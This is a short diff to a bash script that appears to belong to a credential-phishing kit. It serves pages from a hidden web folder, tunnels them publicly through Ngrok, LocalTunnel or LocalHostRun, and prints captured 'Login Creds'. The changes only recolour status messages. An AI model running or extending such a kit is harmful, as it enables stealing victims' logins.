@@ -431,12 +431,12 @@ fi
 start_localhost() {
 
 printf "\e[0m\n"
-printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;97mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
 cd .alex/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 smallbanner
 printf "\e[0m\n"
-printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;97m http://127.0.0.1:5555\e[0m\n"
 
 datafound
 
@@ -445,7 +445,7 @@ datafound
 start_ngrok() {
 
 printf "\e[0m\n"
-printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
 printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
@@ -483,7 +483,7 @@ sleep 1
 fi
 
 printf "\e[0m\n"
-printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
 printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
@@ -512,7 +512,7 @@ printf "\e[0m\n"
 printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
 cd .alex/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
 printf "\e[0m\n"
-printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;97mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
 printf "\e[1;31m[\e[0m\e[1;77m#\e[0m\e[1;31m]\e[0m\e[1;92m Press Ctrl+C to View Login Creds \e[0m\n"
